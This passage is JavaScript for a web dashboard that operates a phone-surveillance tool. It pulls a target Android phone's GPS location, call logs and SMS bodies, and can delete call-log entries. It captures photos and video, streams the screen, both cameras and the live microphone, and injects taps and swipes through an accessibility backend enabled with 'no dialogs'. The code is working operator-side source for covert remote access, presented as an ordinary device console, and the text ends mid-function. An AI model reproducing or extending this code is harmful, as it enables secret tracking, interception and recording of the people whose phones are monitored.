// Device dashboard page — status, location, camera, mic, info
let deviceKey = "";
(async function() {
    const parts = window.location.pathname.split("/");
    deviceKey = decodeURIComponent(parts[parts.length - 1]);
    document.getElementById("deviceTitle").textContent = "DEVICE: " + deviceKey;
    await loadStatus();
    loadCameras();
    loadMedia();
    loadNickname();
    loadCallLogs();
    loadSms();
    loadBattery();
})();

function getHostPort() {
    const [host, port] = deviceKey.split(":");
    return { host, port: parseInt(port) || 8443 };
}

async function api(path, options = {}) {
    const res = await fetch(path, {
        headers: { "Content-Type": "application/json" },
        ...options,
    });
    if (res.status === 401) {
        window.location.href = "/";
        return null;
    }
    return res.json();
}

// Status
async function loadStatus() {
    const { host, port } = getHostPort();
    const data = await api(`/api/device/${host}/${port}/health`);
    if (!data) return;
    const online = data.status === "ok";
    const val = document.getElementById("statusOnlineValue");
    const icon = document.getElementById("statusOnlineIcon");
    if (val) {
        val.textContent = online ? "ONLINE" : "OFFLINE";
        // Offline devices render in black (per spec) — on a light chip so
        // the black stays visible against the dark card.
        val.className = "font-headline text-2xl font-bold value " +
            (online ? "text-maquis-green" : "text-black bg-white/90 px-3 py-1 rounded");
    }
    if (icon) {
        icon.className = "material-symbols-outlined " +
            (online ? "text-maquis-green animate-pulse" : "text-black bg-white/90 rounded-full p-1");
    }
    setVal("#statusUptime .value",
        data.uptimeSeconds ? fmtUptime(data.uptimeSeconds) : "—");
    setVal("#statusNetwork .value", `${host}:${port}`);
    if (data.deviceName) {
        document.getElementById("deviceTitle").textContent = "DEVICE: " + data.deviceName;
    }
}

function setVal(sel, text) {
    const el = document.querySelector(sel);
    if (el) el.textContent = text;
}

function fmtUptime(s) {
    const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60), sec = s % 60;
    return `${h}h ${m}m ${sec}s`;
}

// Device Info
async function loadDeviceInfo() {
    const { host, port } = getHostPort();
    const data = await api(`/api/device/${host}/${port}/info`);
    if (!data) return;
    const box = document.getElementById("deviceInfoData");
    const fields = [
        ["Model", data.model], ["Manufacturer", data.manufacturer],
        ["Android", data.androidVersion], ["Build", data.buildId],
        ["Device", data.deviceId], ["Screen", data.screen],
        ["IP", `${host}:${port}`],
    ];
    box.innerHTML = fields
        .filter(([, v]) => v)
        .map(([k, v]) => `<div class="data-row"><span>${k}</span><span>${v}</span></div>`)
        .join("");
}

// Location
let lastFix = null;
async function getLocation() {
    const { host, port } = getHostPort();
    const data = await api(`/api/device/${host}/${port}/location`);
    if (!data) return;
    const box = document.getElementById("locationData");
    const coords = document.getElementById("locationCoords");
    const map = document.getElementById("locationMap");
    const radar = document.getElementById("locationRadar");
    if (data.latitude && data.longitude) {
        const lat = data.latitude, lng = data.longitude;
        lastFix = { lat, lng };
        coords.innerHTML =
            `<span>LAT: ${lat.toFixed(4)}</span><span class="text-moon-silver/30">|</span><span>LON: ${lng.toFixed(4)}</span>` +
            (data.accuracy ? `<span class="text-moon-silver/40">±${Math.round(data.accuracy)}m</span>` : "");
        box.textContent = `FIX_ACQUIRED: ${new Date(data.timestamp || Date.now()).toLocaleTimeString()}`;
        if (map) {
            map.src = `https://maps.google.com/maps?q=${lat},${lng}&z=16&output=embed`;
            map.style.display = "block";
        }
        if (radar) radar.style.display = "none";
    } else {
        box.textContent = data.error === "no_location" ? "NO_GPS_FIX" : JSON.stringify(data);
    }
}

function openMaps() {
    if (!lastFix) { getLocation(); return; }
    window.open(`https://maps.google.com/maps?q=${lastFix.lat},${lastFix.lng}&z=16`, "_blank");
}

// Camera
async function loadCameras() {
    const { host, port } = getHostPort();
    const data = await api(`/api/device/${host}/${port}/cameras`);
    if (!data) return;
    const list = document.getElementById("cameraList");
    const cameras = data.cameras || [];
    if (!cameras.length) {
        list.innerHTML = `<div class="flex items-center gap-3 p-3 border border-moon-silver/10 rounded opacity-50">
            <span class="material-symbols-outlined text-sm text-moon-silver/60">videocam_off</span>
            <span class="font-label text-sm text-on-surface/60">NO_SENSORS</span></div>`;
        return;
    }
    list.innerHTML = cameras.map((c, i) => `
        <label class="flex items-center gap-3 p-3 border border-moon-silver/20 rounded cursor-pointer hover:bg-surface-container transition-colors">
            <input type="radio" name="camera_sensor" value="${c.id ?? i}" class="text-hunt-crimson bg-void-black border-moon-silver/30 focus:ring-hunt-crimson focus:ring-offset-void-black">
            <span class="font-label text-sm text-on-surface">${c.name || ("CAM_" + (c.id ?? i))}</span>
        </label>`).join("");
}

async function capturePhoto() {
    const { host, port } = getHostPort();
    const sel = document.querySelector('input[name="camera_sensor"]:checked');
    const cameraId = sel ? sel.value : "0";
    const data = await api(`/api/device/${host}/${port}/camera/capture?camera_id=${cameraId}`,
        { method: "POST", body: JSON.stringify({}) });
    if (!data) return;
    const box = document.getElementById("cameraData");
    box.classList.remove("hidden");
    box.innerHTML = `<div class="font-label text-xs text-maquis-green tracking-widest uppercase">CAPTURE_${data.status === "ok" ? "OK" : "FAILED"}</div>`;
}

// Capture AND pull the file into the local store + media catalogue.
async function capturePhotoPull() {
    const { host, port } = getHostPort();
    const sel = document.querySelector('input[name="camera_sensor"]:checked');
    const cameraId = sel ? sel.value : "back";
    const btn = document.getElementById("captureBtn");
    const original = btn.innerHTML;
    btn.innerHTML = '<span class="material-symbols-outlined text-lg animate-spin">progress_activity</span> CAPTURING';
    btn.disabled = true;
    try {
        const data = await api(`/api/device/${host}/${port}/camera/capture/pull?camera_id=${cameraId}`,
            { method: "POST", body: JSON.stringify({}) });
        const box = document.getElementById("cameraData");
        box.classList.remove("hidden");
        box.innerHTML = data && data.ok
            ? `<div class="font-label text-xs text-maquis-green tracking-widest uppercase">CAPTURE_STORED</div>`
            : `<div class="font-label text-xs text-hunt-crimson tracking-widest uppercase">CAPTURE_FAILED</div>`;
        if (data && data.ok) loadMedia();
    } finally {
        btn.innerHTML = original;
        btn.disabled = false;
    }
}

// Video recording (CameraX on phone, duration-limited, auto-pulled)
async function recordVideo(durationMs) {
    const { host, port } = getHostPort();
    const btn = document.getElementById("videoBtn");
    if (btn) { btn.innerHTML = '<span class="material-symbols-outlined text-lg animate-spin">progress_activity</span> RECORDING'; btn.disabled = true; }
    try {
        const data = await api(`/api/device/${host}/${port}/video/record?camera_id=back&duration_ms=${durationMs}`,
            { method: "POST", body: JSON.stringify({}) });
        const box = document.getElementById("cameraData");
        box.classList.remove("hidden");
        box.innerHTML = data && data.ok
            ? `<div class="font-label text-xs text-maquis-green tracking-widest uppercase">VIDEO_STORED ${fmtDur((data.video?.durationMs || 0) / 1000)}</div>`
            : `<div class="font-label text-xs text-hunt-crimson tracking-widest uppercase">VIDEO_FAILED</div>`;
        if (data && data.ok) loadMedia();
    } finally {
        if (btn) { btn.innerHTML = '<span class="material-symbols-outlined text-lg">videocam</span> REC 5S'; btn.disabled = false; }
    }
}

// ---------------------------------------------------------------------------
// Call logs + SMS (v2.0.0 — phone-side providers, TLS-authenticated)
// ---------------------------------------------------------------------------

async function loadCallLogs() {
    const { host, port } = getHostPort();
    const list = document.getElementById("callLogsList");
    const data = await api(`/api/device/${host}/${port}/logs/calls?limit=50`);
    if (!data) return;
    const calls = data.calls || [];
    if (!calls.length) {
        list.innerHTML = `<div class="flex items-center gap-3 p-3 border border-moon-silver/10 rounded opacity-50">
            <span class="material-symbols-outlined text-sm text-moon-silver/60">call</span>
            <span class="font-label text-sm text-on-surface/60">NO_CALLS</span></div>`;
        return;
    }
    list.innerHTML = calls.map(c => `
        <div class="flex items-center gap-3 p-3 border border-moon-silver/10 rounded">
            <span class="material-symbols-outlined text-sm ${callTypeColor(c.type)}">${callTypeIcon(c.type)}</span>
            <div class="flex-1 min-w-0">
                <div class="font-label text-sm text-on-surface truncate">${esc(c.number || "unknown")}${c.cachedName ? " · " + esc(c.cachedName) : ""}${c.count > 1 ? ` <span class="text-hunt-crimson font-bold">(${c.count})</span>` : ""}</div>
                <div class="font-label text-[10px] text-moon-silver/50">${esc(String(c.type || "unknown").toUpperCase())} · ${fmtDur(c.durationSec)}${c.count > 1 ? " TOTAL" : ""} · ${new Date(c.date).toLocaleString()}</div>
            </div>
            <button onclick="deleteCallLog(${c.id})" title="Delete entry" class="material-symbols-outlined text-sm text-moon-silver/40 hover:text-hunt-crimson transition-colors flex-shrink-0">delete</button>
        </div>`).join("");
}

async function deleteCallLog(id) {
    const { host, port } = getHostPort();
    if (!confirm("Delete this call log entry?")) return;
    const data = await api(`/api/device/${host}/${port}/logs/calls/delete`,
        { method: "POST", body: JSON.stringify({ id }) });
    if (data && data.status === "deleted") { loadCallLogs(); }
    else { alert((data && data.message) || "Delete failed — is Artemis the default dialer? (see phone dashboard → DELETE ACCESS)"); }
}

function callTypeColor(t) { return { incoming: "text-maquis-green", outgoing: "text-pyrenees-frost", missed: "text-hunt-crimson" }[t] || "text-moon-silver/60"; }
function callTypeIcon(t) { return { incoming: "call_received", outgoing: "call_made", missed: "missed_video_call" }[t] || "call"; }

async function loadSms() {
    const { host, port } = getHostPort();
    const box = document.getElementById("smsBox").value || "inbox";
    const include = document.getElementById("smsIncludeBody").checked ? 1 : 0;
    const list = document.getElementById("smsList");
    const data = await api(`/api/device/${host}/${port}/sms?box=${box}&limit=50&include_body=${include}`);
    if (!data) return;
    const msgs = data.messages || [];
    if (!msgs.length) {
        list.innerHTML = `<div class="flex items-center gap-3 p-3 border border-moon-silver/10 rounded opacity-50">
            <span class="material-symbols-outlined text-sm text-moon-silver/60">sms</span>
            <span class="font-label text-sm text-on-surface/60">NO_MESSAGES</span></div>`;
        return;
    }
    list.innerHTML = msgs.map(m => `
        <div class="flex items-start gap-3 p-3 border border-moon-silver/10 rounded">
            <span class="material-symbols-outlined text-sm text-pyrenees-frost">${box === "sent" ? "send" : "sms"}</span>
            <div class="flex-1 min-w-0">
                <div class="font-label text-sm text-on-surface truncate">${esc(m.address || "unknown")}</div>
                ${m.body ? `<div class="font-label text-[11px] text-moon-silver/80 mt-0.5">${esc(m.body)}</div>` : ""}
                <div class="font-label text-[10px] text-moon-silver/50 mt-0.5">${new Date(m.date).toLocaleString()}${m.read ? "" : " · UNREAD"}</div>
            </div>
        </div>`).join("");
}

function esc(s) {
    return String(s ?? "").replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
}

// Mic toggle
let micRecording = false;
async function toggleMic() {
    micRecording = !micRecording;
    const btn = document.getElementById("micBtn");
    const box = document.getElementById("micData");
    btn.innerHTML = micRecording
        ? `<span class="material-symbols-outlined text-sm">stop</span> STOP`
        : `<span class="material-symbols-outlined text-sm">fiber_manual_record</span> START`;
    btn.classList.toggle("border-hunt-crimson", micRecording);
    btn.classList.toggle("text-hunt-crimson", micRecording);
    box.textContent = micRecording ? "● RECORDING — 00:00" : "STANDBY";
    if (micRecording) {
        window._micTimer = setInterval(() => {
            const el = document.getElementById("micData");
            const m = Math.floor((Date.now() - window._micStart) / 60000);
            const s = Math.floor((Date.now() - window._micStart) / 1000) % 60;
            el.textContent = `● RECORDING — ${String(m).padStart(2,"0")}:${String(s).padStart(2,"0")}`;
        }, 1000);
        window._micStart = Date.now();
    } else {
        clearInterval(window._micTimer);
        box.textContent = `STOPPED — ${Math.floor((Date.now() - window._micStart) / 1000)}s`;
    }
}

// Refresh all
async function refreshDevice() {
    await loadStatus();
    await loadBattery();
    await loadDeviceInfo();
    await loadMedia();
    getLocation();
    loadCallLogs();
    loadSms();
}

// ---------------------------------------------------------------------------
// Captured media (call recordings, videos, screen recordings, screenshots)
// + device nickname — all served from the local encrypted DB, phone offline OK
// ---------------------------------------------------------------------------

const MEDIA_META = {
    call_recording:  { icon: "call",              label: "CALL RECORDING" },
    video:           { icon: "movie",             label: "VIDEO" },
    screen_recording:{ icon: "smart_display",     label: "SCREEN RECORDING" },
    screenshot:      { icon: "screenshot_monitor",label: "SCREENSHOT" },
    photo:           { icon: "photo_camera",      label: "PHOTO" },
};

function fmtSize(b) {
    if (!b) return "";
    if (b < 1024) return `${b} B`;
    if (b < 1048576) return `${(b / 1024).toFixed(1)} KB`;
    return `${(b / 1048576).toFixed(1)} MB`;
}

function fmtDur(s) {
    if (!s) return "";
    const m = Math.floor(s / 60), sec = Math.floor(s % 60);
    return `${m}m ${sec.toString().padStart(2, "0")}s`;
}

async function loadMedia() {
    const { host, port } = getHostPort();
    const list = document.getElementById("mediaList");
    const data = await api(`/api/device/${host}/${port}/media`);
    if (!data) return;
    const items = data.media || [];
    if (!items.length) {
        list.innerHTML = `<div class="flex items-center gap-3 p-3 border border-moon-silver/10 rounded opacity-50">
            <span class="material-symbols-outlined text-sm text-moon-silver/60">collections</span>
            <span class="font-label text-sm text-on-surface/60">NO_CAPTURES</span></div>`;
        return;
    }
    list.innerHTML = items.map(m => {
        const meta = MEDIA_META[m.kind] || { icon: "folder", label: m.kind };
        const metaLine = [fmtSize(m.size_bytes), fmtDur(m.duration_sec)].filter(Boolean).join(" · ");
        const dl = m.download_url
            ? `<a href="${m.download_url}" target="_blank" title="Download file" class="text-pyrenees-frost/70 hover:text-pyrenees-frost transition-colors p-1">
                 <span class="material-symbols-outlined text-sm">download</span></a>`
            : "";
        return `<div class="flex items-center gap-3 p-3 border border-moon-silver/10 rounded">
            <span class="material-symbols-outlined text-sm text-pyrenees-frost">${meta.icon}</span>
            <div class="flex-1 min-w-0">
                <div class="font-label text-sm text-on-surface truncate">${meta.label}</div>
                <div class="font-label text-[10px] text-moon-silver/50 truncate">${m.path || "—"}${metaLine ? " · " + metaLine : ""} · ${new Date((m.captured_at || Date.now()) * 1000).toLocaleString()}</div>
            </div>
            ${dl}
            <button onclick="deleteMedia(${m.id})" title="Delete entry" class="text-moon-silver/40 hover:text-error transition-colors p-1">
                <span class="material-symbols-outlined text-sm">delete</span>
            </button>
        </div>`;
    }).join("");
}

async function deleteMedia(id) {
    const { host, port } = getHostPort();
    if (!confirm("Delete this media entry from the catalogue?")) return;
    await api(`/api/device/${host}/${port}/media/${id}`, { method: "DELETE" });
    loadMedia();
}

async function saveNickname() {
    const { host, port } = getHostPort();
    const input = document.getElementById("nicknameInput");
    const nick = input.value.trim();
    if (!nick) return;
    await api(`/api/device/${host}/${port}/nickname`,
        { method: "POST", body: JSON.stringify({ nickname: nick }) });
    document.getElementById("deviceTitle").textContent = "DEVICE: " + nick;
    input.blur();
}

async function loadNickname() {
    const { host, port } = getHostPort();
    const devs = await api("/api/devices");
    if (!devs) return;
    const dev = devs[`${host}:${port}`];
    if (dev && dev.nickname) {
        document.getElementById("nicknameInput").value = dev.nickname;
    }
}

// ---------------------------------------------------------------------------
// LIVE VIEW (v2.3.0 video-call area)
//   main feed  = phone screen (MJPEG) or back camera
//   PiP        = front camera (top-right)
//   audio      = live mic (PCM16 mono 44.1kHz -> WebAudio)
// All streams proxy through this dashboard (same-origin, cookie auth).
// ---------------------------------------------------------------------------

async function loadBattery() {
    const { host, port } = getHostPort();
    const data = await api(`/api/device/${host}/${port}/battery`);
    if (!data || typeof data.levelPercent === "undefined") return;
    const val = document.getElementById("statusBatteryValue");
    const det = document.getElementById("statusBatteryDetail");
    if (val) val.textContent = `${data.levelPercent}%`;
    if (det) {
        const src = data.chargeSource || (data.isCharging ? "CHARGING" : "ON BATTERY");
        const temp = data.temperatureC != null ? ` · ${data.temperatureC.toFixed(1)}°C` : "";
        const volt = data.voltageMv ? ` · ${(data.voltageMv / 1000).toFixed(2)}V` : "";
        det.textContent = `${src}${temp}${volt}`;
    }
}

// ---- LIVE VIEW over WebSocket (v2.3.1/v2.3.3) ----
// One wss connection carries screen/back/front JPEG + PCM mic; frames are
// drawn to a canvas (no <img> MJPEG buffering) for smooth playback.
// Binary frame: [1B channel][4B BE length][payload]
//   ch 1 = screen JPEG, 2 = back-cam JPEG, 3 = front-cam JPEG, 4 = PCM16
// Default mode: MAIN canvas = phone screen, CAMERA PiP = top-right window
// (rear by default; FLIP swaps the camera window to front and back).
// Controls: {"cmd":"source","v":"screen"|"cam"} / {"cmd":"camera","v":"front"|"back"}
//           {"cmd":"pip","v":"on"|"off"} / {"cmd":"audio","v":"on"|"off"}
let liveOn = false;
let liveSource = "screen"; // screen fills the main canvas; camera shown in PiP
let liveLens = "back";     // the camera lens shown in the PiP window
let pipOn = true;
let micAudioOn = true;
let liveWs = null;

function updateFlipLabel() {
    const b = document.getElementById("liveFlipBtn");
    if (b) b.title = "Show " + (liveLens === "front" ? "REAR" : "FRONT") + " camera";
    const label = document.getElementById("livePipLabel");
    if (label) label.textContent = liveLens === "front" ? "FRONT" : "REAR";
}

function sendWs(obj) {
    if (liveWs && liveWs.readyState === WebSocket.OPEN) {
        liveWs.send(JSON.stringify(obj));
    }
}

function drawToCanvas(canvasId, blob) {
    createImageBitmap(blob).then(bmp => {
        const c = document.getElementById(canvasId);
        if (!c) { bmp.close(); return; }
        if (c.width !== bmp.width || c.height !== bmp.height) {
            c.width = bmp.width;
            c.height = bmp.height;
        }
        c.getContext("2d").drawImage(bmp, 0, 0);
        fitLivePane(canvasId, bmp);
        bmp.close();
    }).catch(() => {});
}

// Size the LIVE VIEW panes from the REAL feed dimensions so neither the
// screen nor the camera box letterboxes (no side/top black bars). Called on
// every decoded frame; cheap — only writes styles when geometry changed.
function fitLivePane(canvasId, bmp) {
    const isScreen = canvasId === "liveMain";
    const canvas = document.getElementById(canvasId);
    if (!canvas || !bmp || bmp.width <= 0 || bmp.height <= 0) return;
    const ratio = bmp.height / bmp.width;
    // Available vertical space below the row (minus neighbouring UI margins).
    const maxH = Math.round((window.innerHeight - 210) * 0.9);

    let dispW, dispH;
    if (isScreen) {
        // Screen: keep the feed's natural portrait ratio, height-capped.
        let w = Math.round(maxH / ratio);
        if (w > 520) { w = 520; }
        let h = Math.round(w * ratio);
        if (h > maxH) { h = maxH; w = Math.round(h / ratio); }
        dispW = w; dispH = h;
        const card = document.getElementById("liveScreenCard");
        if (card) { card.style.width = dispW + "px"; card.style.aspectRatio = String(dispW / dispH); }
    } else {
        // Camera: fills the column width, height = width / feed ratio (no bars).
        const colW = canvas.parentElement ? canvas.parentElement.clientWidth : 220;
        dispW = colW;
        dispH = Math.round(colW / ratio);
        const wrap = document.getElementById("livePipWrap");
        if (wrap) wrap.style.height = dispH + "px";
    }
    canvas.style.aspectRatio = String(dispW / dispH);
}

function liveStatusHtml() {
    return `<span>LIVE · SCREEN${pipOn ? " · CAM:" + liveLens.toUpperCase() : ""}</span>`;
}

async function toggleLiveView() {
    liveOn = !liveOn;
    const btn = document.getElementById("liveBtn");
    const status = document.getElementById("liveStatus");
    const main = document.getElementById("liveMain");
    const place = document.getElementById("livePlaceholder");

    if (liveOn) {
        // Screen feed needs the accessibility capture backend enabled.
        if (liveSource === "screen") {
            const { host, port } = getHostPort();
            const st = await api(`/api/device/${host}/${port}/screen/status`);
            if (!st || !st.enabled) {
                liveOn = false;
                if (status) status.innerHTML = '<span class="text-hunt-crimson">CAPTURE DISABLED — open the Artemis app on the phone once and tap ENABLE (one-time, no dialogs)</span>';
                return;
            }
        }
        const { host, port } = getHostPort();
        const proto = location.protocol === "https:" ? "wss" : "ws";
        liveWs = new WebSocket(`${proto}://${location.host}/api/device/${host}/${port}/ws/live`);
        liveWs.binaryType = "arraybuffer";
        liveWs.onopen = () => {
            main.style.display = "block";
            if (place) place.style.display = "none";
            // Show the camera PiP window only if the user left CAM PIP on.
            applyPipDisplay();
            btn.innerHTML = '<span class="material-symbols-outlined text-lg">stop</span> STOP LIVE VIEW';
            btn.classList.remove("bg-hunt-crimson/10", "border-hunt-crimson/50", "text-hunt-crimson");
            btn.classList.add("bg-hunt-crimson", "text-white", "border-hunt-crimson");
            if (status) status.innerHTML = liveStatusHtml();
            setLiveBtn(true);
            // Full video-call default: audio on (toggleable).
            if (micAudioOn) startMicAudio();
            sendWs({ cmd: "source", v: liveSource });
            sendWs({ cmd: "camera", v: liveLens });
            sendWs({ cmd: "pip", v: pipOn ? "on" : "off" });
            sendWs({ cmd: "audio", v: micAudioOn ? "on" : "off" });
        };
        liveWs.onmessage = (ev) => {
            const buf = ev.data;
            if (typeof buf === "string") { handleWsText(buf); return; }
            if (!(buf instanceof ArrayBuffer) || buf.byteLength < 5) return;
            const ch = new Uint8Array(buf, 0, 1)[0];
            const len = new DataView(buf, 1, 4).getUint32(0, false);
            if (5 + len > buf.byteLength) return;
            const payload = buf.slice(5, 5 + len);
            if (ch === 4) {
                const samples = new Float32Array(payload.byteLength / 2);
                const dv = new DataView(payload);
                for (let i = 0; i < samples.length; i++) {
                    samples[i] = dv.getInt16(i * 2, true) / 32768;
                }
                pushLiveAudio(samples);
            } else if (ch === 1) {
                // phone screen → main canvas
                drawToCanvas("liveMain", new Blob([payload], { type: "image/jpeg" }));
            } else if (ch === 2 || ch === 3) {
                // camera frame → PiP window (rear/front as selected)
                const blob = new Blob([payload], { type: "image/jpeg" });
                if (liveSource === "cam") {
                    // In cam-only mode the selected lens fills the main canvas.
                    const isMain = (ch === 2 && liveLens === "back") || (ch === 3 && liveLens === "front");
                    if (isMain) drawToCanvas("liveMain", blob);
                } else {
                    drawToCanvas("livePip", blob);
                }
            }
        };
        liveWs.onclose = () => {
            liveWs = null;
            liveOn = false;
            if (recordingOn) { recordingOn = false; setRecBtn(false); showRecIndicator(false); }
            main.style.display = "none";
            if (place) place.style.display = "flex";
            const wrap = document.getElementById("livePipWrap");
            if (wrap) wrap.style.display = "none";
            btn.innerHTML = '<span class="material-symbols-outlined text-lg">play_arrow</span> START LIVE VIEW';
            btn.classList.add("bg-hunt-crimson/10", "border-hunt-crimson/50", "text-hunt-crimson");
            btn.classList.remove("bg-hunt-crimson", "text-white", "border-hunt-crimson");
            if (status) status.innerHTML = "<span>NO_STREAM</span>";
            setLiveBtn(false);
            stopMicAudio();
        };
        liveWs.onerror = () => { try { liveWs.close(); } catch (e) {} };
    } else {
        if (liveWs) { try { liveWs.close(); } catch (e) {} liveWs = null; }
        main.style.display = "none";
        if (place) place.style.display = "flex";
        const wrap = document.getElementById("livePipWrap");
        if (wrap) wrap.style.display = "none";
        btn.innerHTML = '<span class="material-symbols-outlined text-lg">play_arrow</span> START LIVE VIEW';
        btn.classList.add("bg-hunt-crimson/10", "border-hunt-crimson/50", "text-hunt-crimson");
        btn.classList.remove("bg-hunt-crimson", "text-white", "border-hunt-crimson");
        if (status) status.innerHTML = "<span>NO_STREAM</span>";
        setLiveBtn(false);
        stopMicAudio();
    }
}

function toggleFlip() {
    liveLens = liveLens === "back" ? "front" : "back";
    sendWs({ cmd: "camera", v: liveLens });
    updateFlipLabel();
    const status = document.getElementById("liveStatus");
    if (status) status.innerHTML = liveStatusHtml();
}

function togglePip() {
    pipOn = !pipOn;
    const btn = document.getElementById("pipBtn");
    applyPipDisplay();
    if (btn) {
        const span = btn.querySelector("span");
        if (span) span.textContent = pipOn ? "videocam" : "videocam_off";
        btn.title = pipOn ? "Hide camera feed" : "Show camera feed";
        btn.classList.toggle("bg-maquis-green/10", pipOn);
        btn.classList.toggle("border-maquis-green/50", pipOn);
    }
    if (liveWs && liveWs.readyState === WebSocket.OPEN) sendWs({ cmd: "pip", v: pipOn ? "on" : "off" });
}

// The camera feed is shown on the right only while live AND toggled on.
function applyPipDisplay() {
    const wrap = document.getElementById("livePipWrap");
    if (wrap) wrap.style.display = pipOn ? "block" : "none";
}

// ---- v2.3.3: remote-admin control (tap/swipe/buttons), triple RECORD, PiP PLAY ----

const DEV_SCREEN_W = 1080;
const DEV_SCREEN_H = 2400;
let recordingOn = false;

function setLiveBtn(enabled) {
    ["liveFlipBtn", "pipBtn", "micAudioBtn", "liveRecBtn"].forEach(id => {
        const b = document.getElementById(id);
        if (!b) return;
        b.disabled = !enabled;
        b.classList.toggle("opacity-40", !enabled);
        b.classList.toggle("cursor-not-allowed", !enabled);
    });
    document.querySelectorAll("#controlPad .ctl-btn").forEach(b => {
        b.disabled = !enabled;
        b.classList.toggle("opacity-40", !enabled);
        b.classList.toggle("cursor-not-allowed", !enabled);
    });
    updateFlipLabel();
    setLiveVolumeUI(enabled);
}

// Map a pointer event on the (object-fit: contain) feed canvas to device
// screen pixels. The canvas bitmap is the camera frame; the phone screen is
// 1080x2400. Letterboxing is accounted for so taps land proportionally.
function feedToDevice(c, ev) {
    const cw = c.clientWidth, ch = c.clientHeight;
    const aw = c.width || cw, ah = c.height || ch;
    const scale = Math.min(cw / aw, ch / ah);
    const dw = aw * scale, dh = ah * scale;
    const dx = (cw - dw) / 2, dy = (ch - dh) / 2;
    const x = Math.round(((ev.offsetX - dx) / dw) * DEV_SCREEN_W);
    const y = Math.round(((ev.offsetY - dy) / dh) * DEV_SCREEN_H);
    return {
        x: Math.max(0, Math.min(DEV_SCREEN_W - 1, x)),
        y: Math.max(0, Math.min(DEV_SCREEN_H - 1, y)),
    };
}

let dragState = null;

function bindControlCanvas() {
    const c = document.getElementById("liveMain");
    if (!c || c.dataset.ctlBound) return;
    c.dataset.ctlBound = "1";
    c.addEventListener("pointerdown", e => {
        if (!liveOn || !liveWs) return;
        const p = feedToDevice(c, e);
        dragState = { x1: p.x, y1: p.y, moved: false, sx: e.clientX, sy: e.clientY };
        try { c.setPointerCapture(e.pointerId); } catch (err) {}
    });
    c.addEventListener("pointermove", e => {
        if (!dragState) return;
        if (Math.hypot(e.clientX - dragState.sx, e.clientY - dragState.sy) > 8) dragState.moved = true;
    });
    c.addEventListener("pointerup", e => {
        if (!dragState) return;
        const p = feedToDevice(c, e);
        if (dragState.moved) {
            sendWs({ cmd: "input", action: "swipe", x1: dragState.x1, y1: dragState.y1, x2: p.x, y2: p.y });
        } else {
            sendWs({ cmd: "input", action: "tap", x: p.x, y: p.y });
        }
        dragState = null;
    });
    c.addEventListener("pointercancel", () => { dragState = null; });
}

function sendGlobalAction(action) {
    sendWs({ cmd: "input", action: "global", v: action });
}

function showRecIndicator(on) {
    const el = document.getElementById("recIndicator");
    if (!el) return;
    el.classList.toggle("hidden", !on);
    el.classList.toggle("flex", on);
}

function setRecBtn(on) {
    const b = document.getElementById("liveRecBtn");
    if (!b) return;
    const span = b.querySelector("span");
    if (span) span.textContent = on ? "stop_circle" : "fiber_manual_record";
    b.title = on ? "Stop recording" : "Record screen + both cameras";
    if (on) {
        b.classList.add("bg-hunt-crimson/10", "border-hunt-crimson/50", "text-hunt-crimson");
    } else {
        b.classList.remove("bg-hunt-crimson/10", "border-hunt-crimson/50", "text-hunt-crimson");
    }
}

function toggleRecord() {
    recordingOn = !recordingOn;
    sendWs({ cmd: "record", v: recordingOn ? "on" : "off" });
    setRecBtn(recordingOn);
    showRecIndicator(recordingOn);
    if (!recordingOn) {
        // Give the phone a moment to finalize the MP4s, then refresh.
        setTimeout(loadRecordings, 800);
    }
}

function fmtTime(ms) {
    const d = new Date(ms);
    return d.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" });
}

async function loadRecordings() {
    const { host, port } = getHostPort();
    const listEl = document.getElementById("recordingsList");
    if (!listEl) return;
    try {
        const r = await api(`/api/device/${host}/${port}/record/list`);
        const groups = [
            ["screen", r.screen || []],
            ["front", r.front || []],
            ["rear", r.rear || []],
        ];
        const total = groups.reduce((n, [, files]) => n + files.length, 0);
        if (!total) { listEl.innerHTML = '<span class="text-moon-silver/40">— none yet —</span>'; return; }
        let html = "";
        for (const [media, files] of groups) {
            if (!files.length) continue;
            html += `<div class="mt-2 font-bold tracking-widest text-moon-silver/80">${media.toUpperCase()}</div>`;
            for (const f of files) {
                html += `<div class="flex items-center justify-between gap-2 pl-3">
                    <span class="truncate">${esc(f.name)} · ${fmtSize(f.size)} · ${fmtTime(f.mtime)}</span>
                    <button onclick="playRecording('${media}', '${esc(f.name)}')" class="shrink-0 border border-maquis-green/50 text-maquis-green hover:bg-maquis-green hover:text-white transition-colors px-3 py-1 rounded flex items-center gap-1 font-label text-[10px] tracking-widest">
                        <span class="material-symbols-outlined text-xs">play_arrow</span>PLAY
                    </button>
                </div>`;
            }
        }
        listEl.innerHTML = html;
    } catch (e) {
        listEl.innerHTML = '<span class="text-hunt-crimson/70">record list failed — is the phone reachable?</span>';
    }
}

function playRecording(media, id) {
    const { host, port } = getHostPort();
    const wrap = document.getElementById("recordPipWrap");
    const vid = document.getElementById("recordPipVideo");
    if (!wrap || !vid) return;
    vid.src = `/api/device/${host}/${port}/record/${media}/${encodeURIComponent(id)}/file?x=${Date.now()}`;
    wrap.classList.remove("hidden");
    vid.play().catch(() => {});
}

function closeRecordPip() {
    const wrap = document.getElementById("recordPipWrap");
    const vid = document.getElementById("recordPipVideo");
    if (vid) { vid.pause(); vid.removeAttribute("src"); vid.load(); }
    if (wrap) wrap.classList.add("hidden");
}

// Phone → browser text frames (e.g. {"event":"record_saved"}) refresh the list.
function handleWsText(raw) {
    try {
        const msg = JSON.parse(raw);
        if (msg && msg.event === "record_saved") {
            recordingOn = false;
            setRecBtn(false);
            showRecIndicator(false);
            loadRecordings();
        }
    } catch (e) { /* non-JSON control frame — ignore */ }
}

// ---- mic audio playback (PCM16 mono 44.1kHz) over WebSocket ----
const AUDIO_RATE = 44100;
const AUDIO_CHUNK = 4096;
// Prime the playout buffer before connecting the ScriptProcessor. The WS
// delivers mic PCM in bursts (the server drains audio inside its loop, which
// also blocks on up-to-125ms JPEG captures). Without a pre-roll the consumer
// fires while the queue is empty → ~ms gaps / pops on every burst. Holding
// enough pre-roll absorbs jitter so audio never under-runs.
const AUDIO_PRE_ROLL = AUDIO_RATE * 0.25; // 250ms
let liveAudioCtx = null;
let liveAudioNode = null;
let liveAudioGain = null;
let liveVolume = 70;
let liveAudioPrimed = false;
let liveAudioPriming = false;
const liveAudioQueue = [];

function pushLiveAudio(samples) {
    if (!liveAudioCtx) return;
    liveAudioQueue.push(samples);
